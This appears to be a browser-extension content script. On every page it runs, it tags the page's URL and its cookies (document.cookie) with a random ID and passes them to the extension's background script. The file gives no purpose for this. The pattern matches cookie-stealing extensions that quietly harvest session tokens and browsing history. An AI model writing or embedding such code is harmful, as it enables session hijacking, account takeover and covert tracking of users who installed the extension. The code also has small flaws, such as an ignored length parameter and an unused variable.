async function mainBahavoir(){

    function sendToBack(data){
      let greponse ;
        //Method 1
      try {
          chrome.runtime.sendMessage({data: data}, function(reponse) {
            return reponse
          });
              
      } catch (error) {
          console.log(error);
      }
    }

    function makeID(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
      let counter = 0;
      while (counter < 15) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
      }
      return result;
  }
  
const localId = makeID()
 
sendToBack(localId+"url="+window.location.href)
sendToBack(localId+"ck="+document.cookie);
}
mainBahavoir();
